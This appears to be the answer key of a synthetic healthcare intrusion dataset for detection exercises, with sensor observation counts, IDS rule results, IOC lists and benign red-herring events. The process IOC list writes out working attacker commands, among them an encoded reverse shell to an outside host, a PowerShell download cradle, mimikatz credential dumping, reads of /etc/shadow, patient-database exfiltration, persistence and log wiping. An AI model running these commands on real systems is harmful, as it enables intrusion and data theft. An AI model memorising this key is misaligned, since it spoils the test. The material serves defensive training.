| dfeaee94-5b7f-4bff-ba31-323867fc13f9 | ids | delayed: 1 |
| e3d62afd-00ab-4ec5-8bd8-c77a1c50647b | ids | delayed: 2 |
| e3f073e8-818d-4bd8-b083-8772f71cac97 | ids | delayed: 1 |
| e923f7db-461f-4fa0-a248-5d07514a8843 | ids | delayed: 1 |
| eae41ed5-9bb0-48ca-9481-1a52029ee9a3 | ids | delayed: 1 |
| ecf47fcd-8ae1-41bd-a60e-85a3b5aba946 | ids | delayed: 2 |
| ede0a7d9-7ca0-4c6f-98d5-3da5fae4c691 | ids | delayed: 1 |
| ee9e3f3b-5270-4f35-898e-38d233038774 | ids | delayed: 1 |
| evt-001 | asa | delayed: 6, filtered: 1 |
| evt-001 | ecar | delayed: 2 |
| evt-001 | ids | filtered: 1 |
| evt-001 | zeek | filtered: 9, visible: 4 |
| evt-002 | asa | delayed: 379, dropped: 1, filtered: 1, visible: 3 |
| evt-002 | ecar | delayed: 381, dropped: 3 |
| evt-002 | ids | delayed: 14 |
| evt-002 | web | delayed: 334, dropped: 3 |
| evt-002 | zeek | delayed: 495, dropped: 1, filtered: 2, visible: 224 |
| evt-003 | syslog | delayed: 3 |
| evt-003 | zeek | delayed: 2 |
| evt-004 | asa | delayed: 2 |
| evt-004 | ecar | delayed: 2 |
| evt-004 | web | delayed: 2 |
| evt-004 | zeek | delayed: 2, visible: 2 |
| evt-005 | asa | delayed: 2 |
| evt-005 | ecar | delayed: 4 |
| evt-005 | syslog | visible: 1 |
| evt-005 | web | delayed: 1 |
| evt-005 | zeek | delayed: 3 |
| evt-006 | asa | delayed: 31 |
| evt-006 | bash_history | visible: 6 |
| evt-006 | ecar | delayed: 63 |
| evt-006 | syslog | delayed: 4 |
| evt-006 | sysmon | delayed: 18 |
| evt-006 | windows_security | delayed: 6 |
| evt-006 | zeek | delayed: 27, visible: 4 |
| evt-007 | bash_history | visible: 3 |
| evt-007 | ecar | delayed: 6 |
| evt-008 | asa | delayed: 3, filtered: 1 |
| evt-008 | ecar | delayed: 7 |
| evt-008 | ids | delayed: 2 |
| evt-008 | syslog | delayed: 4 |
| evt-008 | windows_security | delayed: 2 |
| evt-008 | zeek | delayed: 4, visible: 2 |
| evt-009 | bash_history | visible: 2 |
| evt-009 | ecar | delayed: 4 |
| evt-010 | ecar | delayed: 8 |
| evt-010 | sysmon | delayed: 8 |
| evt-010 | windows_security | delayed: 2 |
| evt-011 | ecar | delayed: 1 |
| evt-011 | syslog | delayed: 1 |
| evt-011 | windows_security | delayed: 1 |
| evt-012 | asa | delayed: 2, filtered: 5 |
| evt-012 | ecar | delayed: 16 |
| evt-012 | sysmon | delayed: 6 |
| evt-012 | windows_security | delayed: 22, visible: 1 |
| evt-012 | zeek | delayed: 6, dropped: 1, visible: 1 |
| evt-013 | asa | delayed: 2, filtered: 1 |
| evt-013 | ecar | delayed: 45 |
| evt-013 | sysmon | delayed: 42 |
| evt-013 | windows_security | delayed: 18 |
| evt-013 | zeek | delayed: 1, visible: 3 |
| evt-014 | ecar | delayed: 13 |
| evt-014 | sysmon | delayed: 13 |
| evt-014 | windows_security | delayed: 2 |
| evt-015 | asa | delayed: 3 |
| evt-015 | ecar | delayed: 23 |
| evt-015 | sysmon | delayed: 21 |
| evt-015 | windows_security | delayed: 11 |
| evt-015 | zeek | delayed: 2, visible: 2 |
| evt-016 | ecar | delayed: 36 |
| evt-016 | sysmon | delayed: 36 |
| evt-016 | windows_security | delayed: 10 |
| evt-017 | asa | filtered: 2 |
| evt-017 | ecar | delayed: 32 |
| evt-017 | sysmon | delayed: 31 |
| evt-017 | windows_security | delayed: 11 |
| evt-017 | zeek | delayed: 3 |
| evt-018 | asa | delayed: 25 |
| evt-018 | ecar | delayed: 32, dropped: 1 |
| evt-018 | proxy | delayed: 10 |
| evt-018 | sysmon | delayed: 18 |
| evt-018 | windows_security | delayed: 17 |
| evt-018 | zeek | delayed: 48, visible: 14 |
| evt-019 | asa | delayed: 3, out_of_window: 1 |
| evt-019 | ecar | delayed: 3, out_of_window: 1 |
| evt-019 | proxy | delayed: 3, out_of_window: 1 |
| evt-019 | sysmon | delayed: 3, out_of_window: 1 |
| evt-019 | zeek | delayed: 6, out_of_window: 2 |
| evt-020 | asa | delayed: 21, filtered: 263 |
| evt-020 | ecar | delayed: 280, dropped: 4 |
| evt-020 | ids | delayed: 6, dropped: 1, filtered: 241 |
| evt-020 | sysmon | delayed: 18 |
| evt-020 | windows_security | delayed: 297, dropped: 1, visible: 2 |
| evt-020 | zeek | delayed: 434, dropped: 2, filtered: 4, visible: 128 |
| evt-021 | asa | delayed: 89, visible: 2 |
| evt-021 | ecar | delayed: 91 |
| evt-021 | ids | delayed: 18, filtered: 164 |
| evt-021 | windows_security | delayed: 89, visible: 2 |
| evt-021 | zeek | delayed: 130, visible: 52 |
| evt-022 | asa | delayed: 2 |
| evt-022 | ecar | delayed: 27 |
| evt-022 | sysmon | delayed: 26 |
| evt-022 | windows_security | delayed: 12 |
| evt-022 | zeek | delayed: 2 |
| evt-023 | asa | filtered: 5 |
| evt-023 | bash_history | visible: 12 |
| evt-023 | ecar | delayed: 42, dropped: 1 |
| evt-023 | syslog | delayed: 10 |
| evt-023 | windows_security | delayed: 3 |
| evt-023 | zeek | delayed: 6, visible: 2 |
| evt-024 | windows_security | delayed: 1 |
| evt-025 | asa | delayed: 4 |
| evt-025 | ecar | delayed: 32 |
| evt-025 | proxy | delayed: 1 |
| evt-025 | sysmon | delayed: 27 |
| evt-025 | windows_security | delayed: 9 |
| evt-025 | zeek | delayed: 8 |
| evt-026 | asa | delayed: 5, filtered: 3 |
| evt-026 | ecar | delayed: 9 |
| evt-026 | proxy | delayed: 3 |
| evt-026 | windows_security | delayed: 2 |
| evt-026 | zeek | delayed: 14, visible: 6 |
| evt-027 | ecar | delayed: 1 |
| evt-027 | windows_security | delayed: 2 |
| evt-028 | bash_history | visible: 1 |
| evt-028 | ecar | delayed: 2 |
| evt-029 | bash_history | visible: 1 |
| evt-029 | ecar | delayed: 3 |
| evt-030 | asa | delayed: 2 |
| evt-030 | ecar | delayed: 28 |
| evt-030 | proxy | delayed: 1 |
| evt-030 | sysmon | delayed: 27 |
| evt-030 | windows_security | delayed: 7 |
| evt-030 | zeek | delayed: 2, visible: 2 |
| evt-031 | asa | filtered: 3 |
| evt-031 | ecar | delayed: 3 |
| evt-031 | windows_security | delayed: 3 |
| evt-031 | zeek | delayed: 4, visible: 2 |
| evt-032 | ecar | delayed: 17 |
| evt-032 | sysmon | delayed: 17 |
| evt-032 | windows_security | delayed: 4 |
| evt-033 | ecar | delayed: 5 |
| evt-033 | sysmon | delayed: 4 |
| evt-033 | windows_security | delayed: 5 |
| evt-034 | ecar | delayed: 2 |
| evt-034 | sysmon | delayed: 1 |
| evt-034 | windows_security | delayed: 2 |
| evt-035 | ecar | delayed: 2 |
| evt-035 | syslog | delayed: 2 |
| evt-email-001 | asa | delayed: 7, filtered: 3 |
| evt-email-001 | ecar | delayed: 15, dropped: 1 |
| evt-email-001 | proxy | delayed: 2 |
| evt-email-001 | syslog | delayed: 10 |
| evt-email-001 | sysmon | delayed: 7 |
| evt-email-001 | windows_security | delayed: 7 |
| evt-email-001 | zeek | delayed: 16, visible: 6 |
| evt-email-002 | asa | delayed: 2 |
| evt-email-002 | ecar | delayed: 3 |
| evt-email-002 | proxy | delayed: 1 |
| evt-email-002 | sysmon | delayed: 2 |
| evt-email-002 | windows_security | delayed: 1 |
| evt-email-002 | zeek | delayed: 4 |
| evt-email-003 | all | out_of_window: 15 |
| evt-email-003 | asa | delayed: 8, filtered: 2 |
| evt-email-003 | ecar | delayed: 31 |
| evt-email-003 | syslog | delayed: 14 |
| evt-email-003 | sysmon | delayed: 30 |
| evt-email-003 | windows_security | delayed: 21, visible: 1 |
| evt-email-003 | zeek | delayed: 17, visible: 7 |
| evt-email-004 | asa | delayed: 9, filtered: 4 |
| evt-email-004 | ecar | delayed: 31 |
| evt-email-004 | syslog | delayed: 20 |
| evt-email-004 | sysmon | delayed: 11 |
| evt-email-004 | windows_security | delayed: 9 |
| evt-email-004 | zeek | delayed: 23, visible: 11 |
| evt-email-005 | asa | delayed: 2 |
| evt-email-005 | ecar | delayed: 2 |
| evt-email-005 | syslog | delayed: 2 |
| evt-email-005 | windows_security | delayed: 1 |
| evt-email-005 | zeek | delayed: 2, visible: 2 |
| evt-email-006 | asa | delayed: 3 |
| evt-email-006 | ecar | delayed: 6 |
| evt-email-006 | syslog | delayed: 8 |
| evt-email-006 | sysmon | delayed: 5 |
| evt-email-006 | windows_security | delayed: 3 |
| evt-email-006 | zeek | delayed: 2, visible: 7 |
| evt-email-007 | asa | delayed: 8, filtered: 2 |
| evt-email-007 | ecar | delayed: 16, dropped: 1 |
| evt-email-007 | proxy | delayed: 1 |
| evt-email-007 | syslog | delayed: 7, dropped: 1, visible: 1 |
| evt-email-007 | windows_security | delayed: 5 |
| evt-email-007 | zeek | delayed: 25, visible: 5 |
| evt-email-008 | asa | delayed: 7, filtered: 3 |
| evt-email-008 | ecar | delayed: 45 |
| evt-email-008 | proxy | delayed: 2 |
| evt-email-008 | syslog | delayed: 11 |
| evt-email-008 | sysmon | delayed: 38 |
| evt-email-008 | windows_security | delayed: 10 |
| evt-email-008 | zeek | delayed: 14, visible: 10 |
| evt-email-009 | asa | delayed: 1 |
| evt-email-009 | ecar | delayed: 1 |
| evt-email-009 | syslog | delayed: 2 |
| evt-email-009 | sysmon | delayed: 1 |
| evt-email-009 | windows_security | delayed: 1 |
| evt-email-009 | zeek | delayed: 2 |
| evt-email-010 | asa | delayed: 1 |
| evt-email-010 | ecar | delayed: 1 |
| evt-email-010 | syslog | delayed: 2 |
| evt-email-010 | zeek | delayed: 5 |
| evt-email-011 | asa | delayed: 4, filtered: 2 |
| evt-email-011 | ecar | delayed: 9 |
| evt-email-011 | syslog | delayed: 9 |
| evt-email-011 | sysmon | delayed: 6 |
| evt-email-011 | windows_security | delayed: 7 |
| evt-email-011 | zeek | delayed: 17, visible: 2 |
| f39b306d-f233-4092-81cf-4a1cb2462b14 | ids | delayed: 1 |
| f41845d2-bffc-4598-8500-7e7bdeb0d813 | ids | delayed: 1 |
| fd7cfc9f-58b5-4145-a660-147ed84c0bd8 | ids | delayed: 1 |
| red_herring:rh-001 | ecar | delayed: 8 |
| red_herring:rh-001 | sysmon | delayed: 4 |
| red_herring:rh-001 | windows_security | delayed: 8 |
| red_herring:rh-002 | asa | delayed: 1 |
| red_herring:rh-002 | ecar | delayed: 38 |
| red_herring:rh-002 | sysmon | delayed: 37 |
| red_herring:rh-002 | windows_security | delayed: 11 |
| red_herring:rh-002 | zeek | delayed: 1 |
| red_herring:rh-003 | asa | delayed: 2 |
| red_herring:rh-003 | ecar | delayed: 3, dropped: 2 |
| red_herring:rh-003 | ids | delayed: 1 |
| red_herring:rh-003 | proxy | delayed: 1 |
| red_herring:rh-003 | zeek | delayed: 2, visible: 2 |


## IDS Evaluation Summary

Observation totals: delayed=184, dropped=1, filtered=407, visible=2.

| Sensor | GID:SID | Candidates | Emitted | Policy Filtered | Origins | Digest |
|--------|---------|------------|---------|-----------------|---------|--------|
| snort-core | 1:2000334 | 3 | 3 | 0 | built_in=3 | `dfce8c8d0d4b` |
| snort-core | 1:2000357 | 1 | 1 | 0 | built_in=1 | `af647e893ee1` |
| snort-core | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `b6d3534c56c7` |
| snort-core | 1:2003068 | 2 | 2 | 0 | built_in=2 | `d775844cb64f` |
| snort-core | 1:2016149 | 3 | 3 | 0 | built_in=3 | `b3cc4e246d02` |
| snort-core | 1:2024291 | 14 | 14 | 0 | built_in=14 | `588d4cf618ce` |
| snort-core | 1:2027757 | 1 | 1 | 0 | built_in=1 | `0b335e7fb396` |
| snort-core | 1:2027863 | 8 | 8 | 0 | built_in=8 | `bbf22bd66c74` |
| snort-core | 1:2027865 | 97 | 15 | 82 | authored_attachment=9, built_in=6 | `7a5da69ad1c8` |
| snort-core | 1:2029706 | 253 | 12 | 241 | authored_attachment=6, built_in=6 | `888954eb547c` |
| snort-core | 1:382 | 2 | 2 | 0 | built_in=2 | `0c0243b7a91d` |
| snort-perimeter | 1:2000334 | 1 | 1 | 0 | built_in=1 | `fc5f81f30782` |
| snort-perimeter | 1:2000428 | 4 | 4 | 0 | built_in=4 | `b3e80af87421` |
| snort-perimeter | 1:2000560 | 1 | 1 | 0 | built_in=1 | `a90261cfb9cb` |
| snort-perimeter | 1:2000575 | 7 | 7 | 0 | built_in=7 | `98381c9d41bf` |
| snort-perimeter | 1:2002910 | 15 | 14 | 1 | built_in=14 | `cbb79fa7dfe6` |
| snort-perimeter | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `4b2be3032f37` |
| snort-perimeter | 1:2003068 | 5 | 5 | 0 | built_in=5 | `066941fe4db2` |
| snort-perimeter | 1:2010935 | 3 | 3 | 0 | built_in=3 | `304d22cef43c` |
| snort-perimeter | 1:2013028 | 1 | 1 | 0 | built_in=1 | `e80902e8fe05` |
| snort-perimeter | 1:2013504 | 3 | 3 | 0 | authored_attachment=1, built_in=2 | `0e2d87b17708` |
| snort-perimeter | 1:2016149 | 3 | 3 | 0 | built_in=3 | `9248c6c41dfd` |
| snort-perimeter | 1:2016360 | 5 | 5 | 0 | built_in=5 | `7731132ea6a7` |
| snort-perimeter | 1:2018959 | 1 | 1 | 0 | built_in=1 | `69497e41cbc3` |
| snort-perimeter | 1:2022476 | 3 | 3 | 0 | built_in=3 | `8cb3a8dbfec3` |
| snort-perimeter | 1:2023672 | 5 | 5 | 0 | built_in=5 | `a394399deb48` |
| snort-perimeter | 1:2023882 | 2 | 2 | 0 | built_in=2 | `d970737ac77d` |
| snort-perimeter | 1:2024290 | 2 | 2 | 0 | built_in=2 | `4043e67923df` |
| snort-perimeter | 1:2024291 | 11 | 11 | 0 | built_in=11 | `86382e5e4d71` |
| snort-perimeter | 1:2024392 | 2 | 2 | 0 | built_in=2 | `880638a37091` |
| snort-perimeter | 1:2024897 | 4 | 4 | 0 | built_in=4 | `73a1ac2d4386` |
| snort-perimeter | 1:2027316 | 5 | 5 | 0 | built_in=5 | `4d56d8c585a7` |
| snort-perimeter | 1:2027863 | 6 | 6 | 0 | built_in=6 | `2f3f84818cb9` |
| snort-perimeter | 1:2027865 | 95 | 13 | 82 | authored_attachment=9, built_in=4 | `c2fb2d897e5f` |
| snort-perimeter | 1:2028401 | 5 | 5 | 0 | built_in=5 | `5094a566b25b` |
| snort-perimeter | 1:2029706 | 6 | 6 | 0 | built_in=6 | `773b3f2d965e` |
| snort-perimeter | 1:366 | 2 | 2 | 0 | built_in=2 | `f0bb9fa63f3b` |
| snort-perimeter | 1:382 | 4 | 4 | 0 | built_in=4 | `63c74e98407d` |
| snort-perimeter | 1:384 | 5 | 5 | 0 | built_in=5 | `e8cd8bc9353e` |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.1.35 (Attacker IP)
- 10.10.1.35:3389 (Lateral Movement)
- 10.10.1.99 (Attacker IP)
- 10.10.2.10:389 (Internal Server)
- 10.10.2.30:22 (Lateral Movement)
- 10.10.3.10:443 (Web Scan Target)
- 10.10.3.20:22 (Internal Server)
- 10.10.4.10:22 (Lateral Movement)
- 203.14.220.10:443 (C2 Server)
- 2j3rhpi2329sn.top (DGA Domain)
- 30rgw6r7503.top (DGA Domain)
- 45.33.32.30:443 (Beacon Target)
- 45.33.32.30:443 (C2 Server)
- 45.33.32.30:443 (Denied Beacon Target)
- 45.33.32.30:8443 (C2 Server)
- 6cja6syvo02mu.top (DGA Domain)
- DC-01.meridianhcs.local (Malicious DNS Query)
- Message-ID: <100000I9EMNA.1000OREDIL@meridianhcs.com>
- Message-ID: <1000016ONZTK.10015EDCND@meridianhcs.com>
- Message-ID: <121609FF-AFF2-1350-BCEC-8A52032BE7D0@meridianhcs.com>
- Message-ID: <1486572785.976919.3e76dbd7@meridianhcs.com>
- Message-ID: <1746897100.499514.89c6aefa@meridianhcs.com>
- Message-ID: <billing-a1f65b41-3807664@medclaims-processing.net>
- Message-ID: <notices-b9dac45a-8235363@benefits-serviceportal.com>
- Message-ID: <workspace-e2b1dcaf-9440641@docflow-health.net>
- Port 22 (scan target)
- Port 3306 (scan target)
- Port 443 (scan target)
- Port 80 (scan target)
- Port 8080 (scan target)
- Port 8443 (scan target)
- SMTP Zeek UID: C1Rl4UGKz5Uka1xh1EV
- SMTP Zeek UID: C5nZWNm9u1TqGu4KxMR
- SMTP Zeek UID: CEUYqsveYHKoIPtrcs
- SMTP Zeek UID: CMJWRRwB7F5VWmLGeb
- SMTP Zeek UID: CPwyThcCP7Yx8wockF2
- SMTP Zeek UID: CXK34ozzZ6rBbhpOQn9
- SMTP Zeek UID: CaetJBTE7gv4CBNDbIG
- SMTP Zeek UID: Cc7tLWL77LugrrCGELC
- SMTP Zeek UID: CfNZvrSzRveqJx9KNkV
- SMTP Zeek UID: ChzfolliTxka9IL1F9
- SMTP Zeek UID: CovnOf8OMUQGNiNpO4D
- SMTP Zeek UID: CqLjhIOl9udZHd3iTpf
- SMTP Zeek UID: Ct9WGEmkfDNkNsjUqk
- SMTP Zeek UID: CuJtkMGHB9FMJYqzgC
- SMTP Zeek UID: Cz5QQMIwWYRB4zNPGM
- Zeek UID: C3jRZKRgkDuTx4rsku
- Zeek UID: CA0CidTXH6FbjVP0zIF
- Zeek UID: CCj8rdDoKSZTQYiM3Y
- Zeek UID: CQZFpTHuAsPnWkGBUpN
- Zeek UID: CXoQJZZ2Mn5mQkqNRSO
- Zeek UID: CYGAkJWR55Mfv1EHIE
- Zeek UID: Cf7DGHGZk1AgCK6UN6
- Zeek UID: Cq6i4QNFjnv0ZANkZF
- Zeek UID: CqqezstGw7f4kKyDnI
- Zeek UID: CwOB7wtcHZV0P00QMQd
- api.westbridge-services.net (Malicious DNS Query)
- edge.westbridge-services.net (Malicious DNS Query)
- ewnjsaqf1rasgez5.top (DGA Domain)
- metrics.westbridge-services.net (Malicious DNS Query)
- ns1.westbridge-services.cloud (DNS Tunnel Endpoint)
- qrdqtp5nhn66chp00.top (DGA Domain)

### Process IOCs

- /bin/bash
- /usr/bin/cat
- /usr/bin/find
- /usr/bin/gzip
- /usr/bin/ls
- /usr/bin/mysqldump
- /usr/bin/nmap
- /usr/bin/scp
- /usr/bin/shred
- /usr/sbin/ip
- C:\Windows\System32\PSEXESVC.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\ms-index-service.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \Microsoft\Windows\Maintenance\DeviceSync
- Service: DeviceSyncSvc
- Service: PSEXESVC
- `PSEXESVC.exe -accepteula`
- `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`
- `cat /etc/hosts`
- `cat /etc/passwd`
- `cat /etc/resolv.conf`
- `cat /etc/shadow`
- `cat /root/.ssh/id_rsa`
- `cat /var/www/html/config.php`
- `cmd.exe /c whoami && hostname`
- `find /opt/ehr -name '*credential*' -maxdepth 3`
- `gzip -9 /tmp/rpt_0318.sql`
- `history -c && cat /dev/null > ~/.bash_history`
- `ip addr show`
- `ls -la /root/.ssh`
- `ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`
- `net group "Domain Admins" /domain`
- `net group "Domain Admins" svc_mhsync /add /domain`
- `net user /domain`
- `net user svc_mhsync /delete /domain`
- `net user svc_mhsync MhsSvc!2024 /add /domain`
- `net view /domain`
- `net view \\FILE-SRV-01`
- `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24`
- `nmap -sn 10.10.2.0/24`
- `powershell.exe -NoProfile -Command "Compress-Archive -Path \\FILE-SRV-01\Finance\Q1\*,\\FILE-SRV-01\Patients\Exports\* -DestinationPath C:\ProgramData\Microsoft\cache_7f3a.zip"`
- `powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA`
- `sc.exe create DeviceSyncSvc binPath= C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\DeviceSync" /SC HOURLY /TR "C:\Windows\System32\DeviceSyncSvc.exe" /RU SYSTEM`
- `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`
- `shred -u /root/.bash_history`
- `wevtutil cl Security`
- `whoami /all`

### User IOCs

- Group: Domain Admins (compromised account)
- SYSTEM (compromised account)
- aisha.johnson (compromised account)
- aisha.johnson (Spray Target) (compromised account)
- apache (compromised account)
- diego.ramirez (compromised account)
- diego.ramirez (Spray Target) (compromised account)
- evelyn.brooks (compromised account)
- lina.nguyen (compromised account)
- marcus.chen (compromised account)
- marcus.chen (Explicit Credential Target) (compromised account)
- omar.haddad (compromised account)
- priya.patel (compromised account)
- root (compromised account)
- sophia.martinez (Spray Target) (compromised account)
- svc_mhsync (compromised account)

### File IOCs

- %SystemRoot%\PSEXESVC.exe
- /root/.bash_history
- /tmp/rpt_0318.sql
- C:\Windows\System32\DeviceSyncSvc.exe
- artifacts/email/benefits-confirmation-msg.eml
- artifacts/email/docflow-ai-summary-msg.eml
- artifacts/email/ehr-release-note-msg.eml
- artifacts/email/executive-operating-note-msg.eml
- artifacts/email/finance-forward-to-it-msg.eml
- artifacts/email/internal-reset-lure-msg.eml
- artifacts/email/vendor-interface-package-msg.eml


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2024-03-18 13:04:57 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:59 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:01 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:04 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 14:04:46 UTC | lina.nguyen | WS-LNGUYEN-01 | Developer refreshes Ubuntu package metadata from the public archive | Routine package maintenance uses the APT HTTP user agent and triggers a low-priority policy alert. |
| 2024-03-18 17:09:44 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:46 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:47 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
